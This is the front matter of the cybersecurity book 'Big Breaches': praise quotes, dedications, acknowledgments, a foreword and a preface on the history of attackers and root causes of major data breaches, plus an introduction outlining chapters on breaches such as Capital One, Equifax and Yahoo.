Printed on acid-free paper   Advance Reactions to   Big Breaches  “This book uses previous failures in computer security to teach useful  lessons in preventing them in the future.”  —Andy Steingruebl, Chief Security Officer at Pinterest  “Neil and Moudy write in their last chapter how important the mission of  cybersecurity is. What makes this profession different from most other jobs  is the opportunity to have a sense of purpose and mission. Professionals in  this business are, in their own small way, a vital piece of a larger ecosystem  but an essential part of the higher calling toward the protection of their  respective nation’s critical infrastructures, their national and economic  security, privacy, and inherent rights as free citizens in a free democracy.  This sense of purpose matters; it all matters.”  —Robert Rodriguez, Chairman & Founder, SINET  “Moudy and Neil knock it out of the park with this all-too-relevant work.  Having spent 27 years in the FBI, seated in the front row for many of the  incidents described here, I found myself riveted to not only Moudy and  Neil’s spot-on storytelling, but their after-the-fact remediation guidance.  The timing of this book’s release is eerie, given the climate of cyber activity  in 2021!”  —John Caruthers, former FBI SSA  “Taking a systemic, comprehensive, and enterprise view of security  breaches is not only good practice, it should become the standard by  which security programs are evaluated. Focusing on the myriad but  categorized root causes of security breaches is a critical step in establishing   iii   AdvAnce ReActions to Big BReAches   a better understanding of those ‘reasonable’ security practices and  governance activities that effectively mitigate the likelihood of a data  breach as well as minimize their impacts on organizations and consumers  alike. Capturing pragmatic, practitioner-driven insights makes this  book valuable to members of the board, business executives, as well as  technology leaders such as CISOs, CIOs, and CTOs.”  —Matt Stamper, co-author of the CISO Desk Reference Guide    Volumes 1 & 2 , former research director for Gartner  covering incident  response , and CISO & Executive Advisor at EVOTEK  iv   This book is dedicated to my lovely wife Bharti Daswani,  without whose support I would not be able to accomplish  anything in life. For my two young boys Sid and Shivaan for   whom I hope this book can create enough impact to give  them a better world to live in. For my parents Renu and  Murli Daswani who gave me a foundation in life and the  freedom, support, and love to pursue my dreams. For my  brother Susheel Daswani and his wife Anita Daswani   who are helping raise the next generation of Daswanis.   For my mother-in-law, father-in-law, and sister-in-law  Vanita, Jagdish, and Kamini Mankaney for surrounding   our family with love and support.  —Neil Daswani  This book is dedicated to Robyn, wife and life partner, who  has supported my dreams and wild visions. For Samuel and  Sophie who inspire me every day to work a little harder at  being a better Dad and role model. Thank you for the joy  and love that you’ve brought to my life. For my mom and   dad, Alice and Elie, who dared to leave Egypt, our   homeland, to pursue a better future for my brother and me.  —Moudy Elbayadi   Table of Contents  About the Authors

In mid-2017, when Joe Garcia asked  me to give a webinar in support of the program, I thought it might be fun  to cover some recent breaches. I had so much fun working on the content  for that webinar that we started including content on past breaches in the  Foundations of Information Security course that was launched in 2019. As  we were nearing completion of the course, I met with Susan McDermott at  Apress, and we identified a great opportunity for a book to tell the histories  and stories of some of the biggest breaches to date with the intent of giving  a general audience exposure to cybersecurity and ideally helping bring  more people into the field.  As one of the goals of this book has been to help give more people   exposure to the field of cybersecurity, I am proud that we were able  to contribute to that goal during the creation of the book itself. Adithi  Jawahar, Surya Keswani, and Zachary Silver contributed as students to  the chapters on breaches at Target, JPMorgan Chase, OPM, and Yahoo.  Thanks for drafting one chapter each and then collaborating with their  fellow students to edit and iterate the chapters before I gave the chapters a  detailed iteration myself. Even though Adithi and Zachary were excelling  students at top high schools at the time, I was impressed with what they  were able to learn and contribute in a short time period. Surya was close  to finishing his undergraduate degree. I was impressed with not only his  technical and writing capabilities, but he also showed the beginnings of a  good manager in collaborating with Adithi and Zachary, as well as helping   xxi   Acknowledgments  advance their work. The book certainly benefited from Adithi, Surya, and  Zack’s contributions, and I am thrilled that they learned a lot through the  process.  I would like to thank Schwark Satyavolu, Hilary Schneider, Todd Davis,   and David Cowan for the trust that they placed in me in taking on the  CISO role at LifeLock, the leading identity theft protection company in  the United States, in 2015. Although I had certainly developed quite some  depth in several areas of information security from my experiences at  Twitter, Dasient, and Google prior to taking on the CISO role at LifeLock,  the role forced me to develop a comprehensive breadth across all areas of  information security, not to mention continue to build my muscles in the  areas of working with auditors, regulators, trade organizations, the media,  and the board of directors. I was entrusted to provide security not only for  all the personally identifiable information  PII  of several million LifeLock  members but also the PII of over 300 million Americans, as ID Analytics,  one of LifeLock’s subsidiaries, owned a full-fledged credit agency that  helped provide monitoring for account takeovers, fraud rings, and other  forms of attack against consumer identities. To help me succeed in that  role, I made sure that I understood the lessons learned from prior breaches  so that I could guard LifeLock from any and all potential root causes that  resulted in similar breaches at organizations.   Partnerships with colleagues such as Moudy Elbayadi and Sharon  Segev were also invaluable and helped shape my thinking on various  topics discussed in this book. I was so glad that Moudy decided to co- author a few chapters of this book together with me and provide feedback  on others to help improve the quality of the book! I could not have hoped  for a better co-author. Thanks to Lisa Julian for helping me manage my  professional life both at and after my time at LifeLock and Symantec,  without which I would not have been able to juggle all the glass and rubber  balls in my life steadily enough for this book to be one of them.  xxii   Acknowledgments  I would also like to thank Fran Rosch, Donna Kostigen, Carol Hunter,   and Scott Taylor for their support in the follow-on role that I played as  CISO for Symantec’s Consumer Business Unit post its acquisition of  LifeLock. I also could not have succeeded nor learned so much without  the help and partnership of my generals and lieutenants, including  in  alphabetical order  Sujeet Bambawale, Scott Behm, Andrew Citro, Joe  Gervais, Lisa Julian, Dina Mathers, and Heather Wood-Plumb.  Gary McGraw has been immensely helpful to me in my career along  the way, and I am grateful that he agreed to be the technical reviewer for  this book. He so graciously provided feedback not only on the technical  accuracy of this book but, given his depth of experience in writing books  on security, provided a range of comments that has helped make this book  much better than it could have been without his in-depth reviews.  I thank Trinity Ventures and Benhamou Global Ventures for the   opportunity and support that they gave me in furthering my work  on analyzing cybersecurity investments and developing investment  hypotheses. Eric Benhamou had invited me to give a talk on the topic at  his fund’s Technology Advisory Committee  TAC  meeting. Anik Bose and  Marina Levinson provided useful feedback on my presentation at that  meeting. Schwark Satyavolu at Trinity Ventures then invited me to serve  as an Executive in Residence in which I had the immense opportunity to  further the work as well as get a sense of what being a professional investor  at a venture capital firm was like. In addition to spending more time  with Schwark, I was grateful to get to know his fellow investing general  partners Ajay Chopra, Karan Mehandru, and Patricia Nakache, as well  as Noel Fulton, Larry Orr, Gus Tai, and Prakash Ramamurthy. The useful  interactions with both venture capital firms led to Chapter 15 of this book  on cybersecurity investments.  I thank Bob Lord, my boss for most of the time that I worked at   Twitter, who encouraged our entire information security team to pay  attention to the mega-breaches that were taking place at Target and  JPMorgan Chase as they unfolded so that we could defend against similar   xxiii   Acknowledgments  attacks. I took that advice to heart, both before I took on a CISO role  and during my CISO roles at LifeLock and Symantec. I made sure that  I understood the root causes of major breaches to ensure that I could  protect my organization using the lessons learned. Thanks also to Bob for  providing feedback on various chapters in the book, including Chapter 7  on the Yahoo breaches, as he presided as the CISO that led Yahoo  through the breaches disclosed in 2016.  Thanks to my PhD advisor Hector Garcia-Molina, who unfortunately   passed away too early at the age of 65 in 2019. I thank him for teaching  me how to write, how to reason, how to present, and how to persuade.  He recruited me out of Bellcore where I learned much from Al Aho and  Shamim Naqvi.  Thanks to Guido Appenzeller, Prithvi Bisht, Dan Boneh, Andrew   Citro, Sriram Dandapani, Winnona DeSombre, Jim Van Dyke, Shuman  Ghosemajumder, Kiran Kamity, Andreas Kuehlmann, Christopher Harrell,  John Mitchell, Venkat Rangan, Abhishek Singh, Andy Steingruebl, and  Chad Thunberg for reviews and input on various sections of this book.  Guido Appenzeller significantly helped with the technical accuracy of the  security keys description in Chapter 12, and Dan Boneh helped with the  technical accuracy of the Capital One breach in Chapter 2. Any remaining  outstanding errors that one finds can be reported via the Contact Us page  at www.bigbreaches.com and errata will be posted there.  Even with all the reviews that we have had of various chapters in this   book, we expect that this work will definitely not be perfect, and errors  will likely be discovered after publication. For any such errors found after  publication, we ask in advance for forgiveness as we have done the best  we can in the allotted time that we had to write and publish this book.  Our hope and expectation is that there will be much good that will come  about from sharing the lessons from past breaches described in this book.  Our hope is that these lessons will empower other organizations to defend  themselves, and such good will hopefully outweigh any negative impact   xxiv   Acknowledgments  due to errors in our research and writing. For the organizations that have  experienced the breaches that we write about in this book, we empathize  with the challenges that your organization has been through, and hope you  can empathize that we have researched our information based on what we  believe to be credible, publicly available sources. That said, such sources  may themselves have errors. Should there be errors due to such sources or  our own errors, we apologize in advance and will post corrections in the  Errata at the www.bigbreaches.com site once we can independently verify.  Also, although there are many references provided in footnotes   throughout the chapters of this book, we include a more comprehensive  set of references on the book’s website at www.bigbreaches.com. As many  of our footnotes are URLs, some or all of which are expected to become  stale over time, we will do our best to keep such footnote references   up-to-date on the www.bigbreaches.com site when we become aware   that a link is broken.  I thank Susan McDermott for taking on this book at Apress. She has  been a stellar executive editor to work with. We brainstormed the idea  for this book over lunch in New York and both had interests in using  the book to bring more people into the field. Thanks to Rita Fernando  for a smooth experience in moving the book through various phases of  editorial review. Thanks to Jonathan Gennick, the editor of my first book  with Apress, for keeping in touch over the years and connecting me with  Susan McDermott. Thanks to Rita Fernando and Laura Berendson for  helping us coordinate and develop this work. Thanks for Welmoed Spahr  for approving this project. Thanks to the Apress Springer production team  including Sherly Nandha, Krishnan Sathyamurthy, Garrish Selvarasi, and  Joseph Quatela.  Finally, thanks to anyone whom I inadvertently omitted who may have   provided some feedback along the way!  —Neil Daswani  xxv   Acknowledgments  Thanks to the many leaders and bosses who saw qualities in me that  needed to be cultivated before I knew it. You believed in me and gave me  opportunities and challenges, for which I’m deeply grateful. It’s humbling  to know that without your support, interest, and care, I would have never  been able to become the leader that I am today. Hilary Schneider for  her support and guidance as my CEO and friend. Larry McIntosh for his  friendship and wise counsel. Dev Patel, my mate in many battles! Ty Shay  for his brilliant strategic thinking. Scott Carter, who has been my San  Diego–based comrade. There’s nothing like doing meaningful work with  people that you love to be around. Thanks to Cesar Enciso for being a great  technology partner and friend. Shyam Manwani, John Geddis, Ed Goddin,  Jim Fitzpatrick, Greg Ingino, and Schwark Satyavolu. To the many great  teams that have taught me so much at Intuit, Active Network, ID Analytics,  LifeLock, Symantec, Wag!, Brain Corp, and Shutterfly.  I want to thank Neil, my co-author, colleague, and friend. It was a late  evening in early 2020 in San Francisco. I had just completed a long day at  work and was walking toward the Ferry Building when I ran into Neil! After  catching up, he said he was writing a book on data breaches and security.  It must have been fate because I had been considering writing a book to  help executives, CEOs, and board members grasp the urgency and the  seriousness of security in general and data breaches in particular. That  chance encounter led to a great collaboration and this finished book. Neil  is intelligent, insightful, and comprehensive in his knowledge and thought  leadership. I enjoyed our weekly check-ins and many conversations as the  book was unfolding. I’m deeply grateful to him and for the opportunity to  contribute to furthering this critical topic of our time.  —Moudy Elbayadi  xxvi   Foreword  Neil and Moudy have written a book that will help us reduce our exposure  as a society to future “big breaches” but also to many of the technology  risks we face in an increasingly digitized society. They do this not by  presenting a “recipe” for success but by making the subject accessible to  audiences who are not usually addressed by cybersecurity books.  Cybersecurity, or more broadly computer and information security,  is now very clearly a concern for more than just the security specialist or  the software engineer. That’s been true for a while. But while the technical  bookshelves are full of security textbooks and guides, I don’t think we’ve  yet seen the range of material which would help bring a greater variety of  backgrounds and professions into the security tent. Policy and political  analysis or hacker human interest stories are increasingly common subject  matter for the publishing industry. They are important as the field grows,  but I see in Big Breaches a category that blazes a different and challenging  trail—bridging the divide between the deep technical details of attacks  and the practical technical, corporate, and societal actions which would  make us less vulnerable. It is not easy to summarize or simplify while  remaining accurate and useful, but that is what this book does. I hope Big  Breaches is but one of the many books that will continue to fill this gap of  understanding.  Let me illustrate this with a couple of topics which are integral to Neil  and Moudy’s narrative. They’ll discuss them in greater detail, but I think  they are particularly important as we build this societal understanding. First is the ever-so-exciting “hygiene and maintenance.” That’s part   of the problem; nobody wants to do it. But hygiene, starting with an  accurate inventory of the IT assets and data which any company relies   xxvii   foRewoRd  upon, is foundational to cyber defense in the twenty-first century.  Beyond inventory, it’s not hard to see why hygiene is often ignored. Who  wants to spend their time on bug fixes or rewriting code and testing it  for a new version of middleware or a new database when you could be  innovating for your customers? The shiny object of a new user journey  on a mobile platform or expanding into new markets and geographies is  stiff competition for the software developer’s time. How do we get better  at hygiene? It’s not the only way, but a shared understanding between the  technical experts and the business decision makers of the vulnerabilities  that sloppiness can introduce is a necessary start. To help build such  a shared understanding, the first part of Big Breaches shows how lack  of hygiene in defending against several root causes  e.g., phishing,  malware, third-party compromise or abuse, unencrypted data, software  vulnerabilities  has led to many big breaches.  Hygiene could and often does include the management of legacy   technology—one firm’s end-of-life server or mainframe is another  firm’s core processing system, running the heart of the business. But the  strategies for keeping or replacing technology have specialized enough  that they deserve their own discussion. The speed at which vendors create  new or improved versions of software has increased to the point that  not even startups can avoid these questions. There has to be literature  or studies from an analogous or historically similar phenomenon, but  we don’t yet seem to have an agreed-upon and efficient approach to  managing, avoiding, or even acknowledging the specific risks and cost  benefits of different approaches to legacy technology. This introduction  won’t answer that question, but you will see it again and again in the case  studies. And as a broader audience wrestles with the issue, I am optimistic  that CIOs and others will receive the help they need to manage the risks  of legacy technology and the circumstances which create legacy to begin  with. It is now a business problem and not just an inevitable IT product  lifecycle.  xxviii   foRewoRd  Cloud and software-as-a-service  SaaS  will feature in the breaches  discussed near the beginning of the book, inevitable given the reverse  chronological organization. As a start, the lessons of hygiene and legacy  technology apply to more modern environments like cloud or SaaS. That  will always be true no matter how current your technical stack. But it is  also worth considering the step function represented by cloud or platform  computing depending upon how you think of a SaaS offering. Many of the  issues described in the first part of the book are the result of mistakes or  vulnerabilities quite low in the stack  patching  or at least in common software  applications  email . The modern cloud removes some but not all of those  issues from the enterprise IT staff’s responsibilities  e.g., see the example of  Spectre and Meltdown . That doesn’t mean they are risk-free, but it does mean  the scale and expertise that are difficult to find and manage in companies  small and large can now be concentrated in major platform providers.  The consistency, the monitoring, and the assurance have all improved  dramatically in the modern cloud environment. We should consider the  implications and opportunities of that change as society continues to invest  in digital transformation. Can we reach new levels of safety and soundness  rather than recreating the sins of the past in a new environment?  I’ll finish by highlighting that there is something for everyone in this  book. It isn’t just about the security professional, which I’ve already said,  but it isn’t also just about the business relationship with technology.  Users, regulators, vendors, policymakers, designers, consultants, and  so on will all benefit. We live in a digital world, and every innovation, or  every technology, is dual use. So while everyone is busy making things  better, those enhancements can also be used against us as a society or as  individuals. Or they can also be the source of a change or a mistake which  opens the door for future breaches. As long as there is innovation, there  will be new risks. Whether they are “big breaches” depends largely on how  we, broadly defined, learn from Neil and Moudy’s book.  —Royal Hansen,   VP of Security, Google  xxix   Preface  I  Neil  am a US citizen who was born and raised in America. It deeply  pains me that over the past several years, America has been hacked.  The hacking of the United States includes many key public and private  sector organizations, as well as potentially even the presidency itself. The  hacking of the United States has not been a singular event. In a series  of breaches, key background data of over 20 million US government  employees and a large fraction of US consumer financial and social media  records have been stolen, among a treasure trove of other data. As per the  Mueller report, even the outcome of the 2016 US presidential election was  influenced by foreign interests in a manner never seen before in history.  And, the worst of it may not be over as we are still just learning about the  impact of the SolarWinds hack on various US government agencies.  Over the past 15 years, more than 9,000 data breaches have occurred,   as per the data breach chronology at www.privacyrights.org, which  aggregates information from a variety of public data sources. Whenever  there is a data breach in which someone’s name—in addition to data fields  such as a social security number—is stolen out of an organization  by  attackers  or inadvertently exposed, organizations are required by state  laws to report data breaches to state attorney generals.  There are also many breaches that organizations are not aware   of and hence are not reported. Some security companies that  monitor the “dark web”  websites run and used by the cybercriminal  underground  track many breaches beyond the ones that are known to  the organizations that have been breached and publicly reported. In  particular, many breached organizations may be unaware of breaches  that have occurred within their organizations based on personally  identifiable information  PII  and stolen credentials that are being   xxxi   PRefAce  traded on the dark web. These thousands upon thousands of both  publicly reported and unreported data breaches have resulted in billions  of stolen and lost or exposed consumer records.  A traditional view of information security includes achieving seven  key security goals which I covered in my previous book Foundations of  Security  Apress, 2007 : authentication, authorization, confidentiality, data  integrity, accountability, availability, and nonrepudiation. Given some of  the larger attacks over the past several years, including the misinformation  and disinformation attacks launched by the Russians leading up to  the 2016 presidential election, we clearly need to broaden our view of  information security.  When I co-authored Foundations of Security, I mainly focused on web   application software vulnerabilities, as I was quite certain that the situation  of security on the Internet was going to get worse due to the explosion  of the Web, but quite honestly I do not believe I would have been able to  predict that the situation was going to get as bad as it has become over the  past 13 years. At the time back in 2007, I was working for Google, founded  by Larry Page and Sergey Brin, former classmates of mine from the  Computer Science PhD program at Stanford. Larry and Sergey were much  smarter and insanely more successful than I was, but I had hoped that I  could help make a very small fraction of the positive impact they had on  the world with their search engine.  In particular, I had hoped that by helping secure the Web from software  vulnerabilities and malware, we could create a world in which users could  safely browse anywhere. I had left Google to co-found Dasient, which  Google Ventures funded, to provide early detection of malware infecting  websites and ads. Dasient was acquired by Twitter to proactively mitigate  click fraud and malvertising before Twitter’s initial public offering. The  good news is that I believe we were successful as Twitter’s platform did not  suffer from the onslaught of click fraud attempts and lawsuits that Google  and Facebook had to deal with, perhaps in part because of the protections  the ex-Dasient team were able to put in place after the acquisition. We   xxxii   PRefAce  were also able to build some protections into Twitter’s platform for  malvertising and built systems that eliminated many millions of phishing  and malware links in tweets.  From 2007 to 2012, I had hoped that there was a possibility that  we could have recovered from worms such as Code Red and Nimda  that were shifting from leveraging low-level software vulnerabilities  like buffer overflows to the Samy Worm that leveraged web application  vulnerabilities, shutting down MySpace for several hours. Instead, as goes  the saying so well known in the National Security Agency, attacks have  only gotten better.  Starting in 2013 with the mega-breach at Target, and from the many   mega-breaches that followed, it became clear that malware, Internet worms,  and software vulnerabilities were only a few of the problems that would need  to be addressed. From the analysis of all the mega-breaches and the over  9,000 other reported breaches over the past 15 years, one of the key themes  of the book is that there are six common root causes vectors that lead to  breach: phishing, malware, third-party compromise or abuse, unencrypted  data, software vulnerabilities, and inadvertent employee mistakes  aside  from phishing . In the chapters of the first part of the book, we will see how  each of the mega-breaches occurred due to one or more of these root causes.  The second part of the book focuses on how to address these root causes. We desperately need more people to enter the cybersecurity field— and make information security tools easier for laypeople to use—if we  hope to recover. As of 2021, there are hundreds of thousands of unfilled  cybersecurity jobs in the United States  approximately 500,000 as per  one estimate as of 2021 from www.cyberseek.org1  and less than one  million cybersecurity professionals working in the field. That is a negative  unemployment rate of just over 50%! It is also not unreasonable that  millions of cybersecurity professionals will be needed worldwide.  1 www.cyberseek.org heatmap.html  xxxiii   PRefAce  It is unlikely that all those positions will be filled in short order, nor  should they be. Many of those positions may be for entry-level security  analysts, and a more scalable approach would be to invest in the  appropriate engineering to automate those jobs away and have such folks  invest their time and energy in security activities that cannot be easily  automated away by computers.  For higher-level or more technically sophisticated positions, we will   need to train more people to enter into the field and make it possible  for laypeople to more easily specify the policies that systems should  implement without having to do so by programming or writing computer  code. We need to aggressively further automate countermeasures and  defenses and build a global cybersecurity workforce for decades to come.  How did the world get to such a state? The Internet started   becoming commercialized in the mid-1990s, so we are only 25 years into  commercialization. Security protections that consumers and employees in  organizations can adopt are all still in their relative infancy.   Historical Perspective If we go back to the late 1800s when cars first started appearing on the  market, they did not have seatbelts. In fact, it wasn’t until 1959 when Volvo  introduced the first car with lap-and-shoulder seatbelts  as we know  them today  as an optional feature. It was several decades before such an  important life-saving countermeasure was invented and made available. In  fact, it was 10 years after such seatbelts were first deployed as optional that  there was a federally mandated regulation that all car manufacturers have  to put lap-and-shoulder seatbelts in their cars.  Today, we have many other safety countermeasures inside of cars.   Cars have steel door frames, driver and passenger side airbags, rear- view  mirrors that will light up if there is somebody in your blind spot, steering  wheels that will vibrate if you start veering out of your lane, and collision   xxxiv   PRefAce  avoidance systems that will start beeping at you if you are about to  enter into an accident. When I drive my Tesla these days and enable the  autopilot feature, the car more or less drives safely for me  or so I hope .  But all of these safety countermeasures and features have come into place  over several decades.  Today, all these safety features come together to prevent accidents.  If there is an accident, such features will try to contain the damage and  minimize the impact to the consumers in the vehicles.  Much like the invention of the automobile, the Internet has given   consumers and employees a lot more capability and freedom than ever  before. Consumers and employees in organizations know that the Internet  can be unsafe. They may not understand all the details, but they are still  nevertheless constantly under attack.  One day it may be the case that the hardware and the software that  we use to interact on the Internet will, hopefully, make it as easy as just  putting our seatbelt on in order to safely use the Internet. My hope as a  technologist is that things will be good enough that the technology will  be able to put the seatbelt on for us. And even better will be that federally  mandated regulations will be in place, as it seems quite clear that the  industry has not been able to self-regulate and self-secure given the  staggering number of data breaches that have taken place.  Until then, Chief Information Security Officers  CISOs  in medium-   and large-sized organizations will be responsible for instrumenting  their organizations with the equivalent of digital seatbelts and other  countermeasures to allow for safe and secure Internet usage.  CISOs and their teams have a tough job. They need to protect  an organization against many different forms of attacks against an  organization’s information assets and need to do their best to close as  many software and systems vulnerabilities as possible. Attackers, on the  other hand, need to find just one vulnerability to get their foot in the  door. As such, it is important for CISOs and their teams to employ a well-  thought- out, multipronged strategy based on an understanding of what are   xxxv   PRefAce  the most significant risks and threats to their organization. Thinking about  the “who, what, and where” is important for the CISO and their team.  Some of the strategic questions that need to be tackled are:     What are the organization’s crown jewels and where are   they?  from?   defend against?     Who are the attackers an organization is trying to      Where is the attack emanating  or going to emanate    The typical profiles of the attacker  “who”  have expanded and become   more diverse over the decades, in addition to what they are after and  where the attack will emanate from. Although teenagers who just wanted  to experiment or make a name for themselves were an early attacker  profile, an additional attacker profile was cybercriminals who were out to  make money, and then followed nation-state attackers who had corporate  espionage, intelligence, and military goals in mind.  From the mid-1980s to the early 2000s, relatively unsophisticated  “one-man” attackers  e.g., graduate students, hobbyists, and amateur  programmers  would write worms, such as the Morris, Code Red, and SQL  Slammer worms. Worms were simply viruses that would copy themselves  onto other machines over the network  a process that occurred quickly  and sometimes with a payload that could do something worse , but  mainly generated a lot of traffic and productivity disruption in the process  of copying themselves. For instance, SQL Slammer was the first such  worm that the White House was notified of due to its disruption of ATM  machines and travel reservation systems. However, these attacks weren’t  targeted at any one particular organization.  By contrast, cybercriminal attacks that grew through the mid- to   late 2000s were conducted by teams of attackers whose goal was more  focused—specifically, focused on making money for the attackers    xxxvi   PRefAce   see Table 1 . Such groups of cybercriminal attackers structured  themselves in a manner that resembled legitimate, for-profit corporations,  and within just a few years, an “underground economy” arose. The  operations of cybercriminal groups were often more profitable than  physical crime, not to mention could scale faster, and presented less  harm to the attackers as they could be thousands of miles away from their  targets and victims, evading law enforcement. Examples of cybercriminal  schemes included charging ransom to banks to stave off distributed  denial-of-service  DDoS  attacks that would take their sites offline,  conducting large-scale botnet- based click fraud to defraud advertisers and  search advertising networks, and selling fake anti-virus software en masse  to consumers whose machines really were not infected.

Such groups are typically very well funded, patient   may conduct their attacks over a period of years , and sophisticated   may research and identify new “zero-day” vulnerabilities or develop new  technology to conduct their attacks . They have a variety of motivations, of  which espionage is just one.  Operation Aurora, in which Google and three dozen or so other   corporations were targeted in 2009, and APT1, in which over 150  organizations were victimized over a seven-year period, were examples of  “advanced persistent threat” types of attacks in which corporate espionage  was a suspected or likely goal. In these types of attacks, spear phishing,  malware drive-by-downloads, and social engineering are common  mechanisms used as part of the attack. We will cover these mechanisms,  among others, in the next chapter on the top technical root causes of hacks  and breaches.  Following the Aurora attack, Google realized the failings of the   traditional perimeter security approach in which the assumption was that  any machine on the inside of the corporate perimeter could be trusted  and developed a “zero trust” approach that they later called BeyondCorp.2  In a zero trust approach, every user and machine must be verified every  time they want to connect to the network, and the security posture of the  user identity and the machine should ideally be continuously verified. In  such a model, a user’s identity becomes the new perimeter in conjunction  with the machine that they are logging in from. Many organizations are  working to embrace a zero trust approach to defend themselves against  cybercriminals and nation-states.  2 Ward, R., & Beyer, B.  2014 . BeyondCorp: A New Approach to Enterprise  Security. login Usenix Mag., 39.  xxxviii   PRefAce  In addition to espionage, nation-states may also conduct attacks to  attempt to degrade an adversary’s capability to manufacture weapons  of mass destruction, without firing a single bullet or launching a single  missile. In the Stuxnet attack discovered in 2010, for instance, malware  that targeted centrifuges that could be used to enrich uranium infected  60% of the computers in Iran. By speeding up or slowing down centrifuges,  disrupting the activities of engineers, the malware interfered with Iran’s  ability to develop weapons-grade uranium and manufacture nuclear  weapons.  In both the case of organized cybercriminals and nation-state actors,   the key difference that has occurred over the past several years is that  many of their attacks have become mission based, as opposed to attacks  of opportunity. Attackers often have well-defined mission in mind, and  they will pursue that mission over a period of months or years until they  achieve their goal. The SolarWinds supply-chain attack discovered in late  2020 is such an example.  To achieve their mission, attackers often start by making an initial   compromise, either by phishing an employee, acquiring account  credentials, or installing malware on their machine. Once attackers  have acquired an account or a machine, they then use the account or  machine to take control of more accounts and or more machines. The  set of accounts and or machines that the attacker has control over can be  referred to as an attacker’s “footprint” in an organization, and attackers  work to grow their footprint. Once a machine is compromised, the attacker  can install malware on that machine such that even if the machine is  rebooted, the attacker has an “established foothold” in the organization.  With the compromised machine under the attacker’s control, they can  conduct internal reconnaissance and scan for other machines that may not  have been previously accessible but are now. Like a game of chess, when  attackers are able to move from one square to another, they can threaten  additional pieces that they were not able to threaten before.  xxxix   PRefAce  Taking control of accounts and machines that have increasing amounts  of privilege is part of the attacker’s game. If the attacker gets to spear phish  an administrative assistant, the next step is to get access to their boss’  account for a more sensitive system. If a guest account is compromised  on a machine because it was using a default password, the next step for  the attacker is to leverage an operating system vulnerability that allows  them to exercise higher privileges than those offered by the guest account  or install malware using the guest account that can be used as a stepping  stone to compromise more privileged accounts.  When an attacker has compromised an account, such as an email  account, it may then give the attacker the ability to access information  in the user’s inbox and email other members of an organization from  a legitimate email address. Access to other types of accounts, such as  ticketing systems, customer relationship management systems, corporate  directories, enterprise resource planning systems, and so on, each give  attackers the ability to grow their footprint in different ways.  The attacker grows that footprint over days, months, or years until they  are able to accomplish their mission. If their mission is to steal intellectual  property in the form of source code, then an engineer’s account credentials  to the source code repository are the key to the crown jewels. If their  mission is to steal identity information, a database administrator’s account  credentials are the key to the crown jewels. Whatever is the attacker’s  mission, laterally moving from one system to another and acquiring  control of additional accounts while being undetected is the name of the  game. Such is the “attacker lifecycle” as published by Mandiant in 2013 in  their report on APT1.  As we will see in many of the breaches described in the first part of  this book, the attacks were not “hit-and-run” but rather mission based,  methodical, persistent, determined, and patiently carried out by the  attacker over time. There are many lessons to be learned from the histories  and stories behind the big breaches described in the first part of this book.   xl   PRefAce  In the first part of this book, we cover the root causes of these breaches from  the 2013–2019 timeframe and how to avoid them in the future. That said,  one could go even farther back in history, but for that we refer the reader to  Nick Shevelyov’s book, Cyber War...and Peace,3 in which he covers what can  be learned from the philosophies of the Hammurabi, Spartans, Romans,  Chinese, French, Prussians, and other cultures as it relates to cybersecurity. In the second part of this book, we focus on developing the right habits  as well as advice for various audiences  boards of directors, technology and  security leaders, consumers, investors, and those looking to enter the field   to achieve security.  3 Shevelyov, N.  2021 .

Scribe Media.  xli   Introduction  In the first part of this book, we analyze some of the largest hacks and  data breaches, their root causes, and lessons that can be learned. Spanish  philosopher George Santayana is attributed the quote "Those who cannot  remember the past are condemned to repeat it." If we are to avoid big  data breaches from occurring in the future, we first need to know the past  and must then ideally remember that past like the back of our hands.  Only then can there be a hope that we can avoid repeating it. However, as  remembering all the details of the histories of the biggest data breaches  to date can be too much information, we also seek to simplify, abstracting  away many of the details and succinctly reducing breaches down to their  root causes. Certainly, Chief Information Security Officers  CISOs  have  too much to deal with in compliance standards including PCI, ISO 2700x,  NIST 800-53, FedRAMP, NIST Cybersecurity Framework, HIPAA, GDPR,  CCPA, GLBA, and on, and on, and on. Is there a smaller set of things that  CISOs can focus on to avoid the root causes of breach, even if there may be  hundreds of compliance checkboxes to satisfy?  In Chapter 1, we first identify three “meta-level” causes of breach— the failure to  1  prioritize,  2  invest, and  3  execute on cybersecurity  initiatives. We then identify six more “technical” root causes of breach to  date—phishing, malware, third-party compromise or abuse, unencrypted  data, software vulnerabilities, and inadvertent employee mistakes  aside  from phishing . We will see that third-party compromise or abuse can  include third parties that are suppliers, partners developers, customers,  or potential acquirees. Software vulnerabilities could either be first party,  consisting of design flaws or implementation bugs in code developed  by the company itself, or third party, which need to be addressed by   xliii   intRoduction  vulnerability management and patching. But nevertheless, the six  “technical” root causes of breach account for all the mega-breaches  that we cover in this book and the overwhelming majority of over 9,000  reported data breaches.  We expect that over time, the attacker’s methods will change, as will   root causes of data breaches. At the same time, someone once said “History  doesn’t repeat itself, but it often rhymes.”1 As “attacks always get better,” we  expect that we will have to protect against all of the root causes of the past,  plus the new ones that evolve over time. But we expect that new breaches  will occur due to similar causes from the past, even if not exactly the same.  Once we outline the root causes of breaches to date in Chapter 1,   Chapters 2–8 then walk through some of the biggest breaches in reverse  chronological order in detail:     Chapter 2 covers the Capital One data breach of 2019,  which was the largest cloud security data breach at the  time. In this breach, a lone ex-Amazon employee took  advantage of a software vulnerability and a firewall  misconfiguration to steal over 100 million credit card  applications.     Chapter 3 covers the Marriott data breach announced   in 2018, in which over 383 million customer records  were stolen due to its acquisition of Starwood Hotels,  a third-party company that it acquired which was  compromised due to malware.     Chapter 4 covers the Equifax breach of 2017, in which   over 145 million credit records were stolen due to  a third-party software vulnerability, among other  contributing factors.  1 This quote has often been attributed to Mark Twain, but it is unclear where it  originated.  xliv   intRoduction     Chapter 5 covers several Facebook hacks and data  breaches in 2016 and prior. Facebook’s service was  abused due to third-party partner Cambridge Analytica  leading up to the 2016 US presidential election.  Facebook also had software vulnerabilities in its “View  Page As…” functionality which allows users to see what  their profiles look like when logged in as other users,  and attackers were able to steal profile data of over 50  million users.     Chapter 6 covers the Office of Personnel Management   breaches in 2014 and 2015 in which identity data of  over 20 million government employees were stolen.     Chapter 7 covers data breaches at Yahoo in 2013   and 2014 in which phishing, malware, and reverse  engineering of its cookie generation algorithm were  used to compromise all 3 billion Yahoo user accounts.     Chapter 8 covers data breaches at Target and JPMorgan  Chase in 2013 and 2014, in which third-party suppliers  Fazio Mechanical Services and Simmco Data Systems,  respectively, were compromised as intermediaries  leading to breaches of tens of millions of customer  records in each case.   Also, as the SolarWinds hack of December 2020 was announced after   this book went into production, you can find a free book chapter about the  SolarWinds hack posted on the book’s website at www.bigbreaches.com.  In the second part of this book, we outline a road map for recovery   from the board level down, starting with teaching people the right habits  to achieve security, 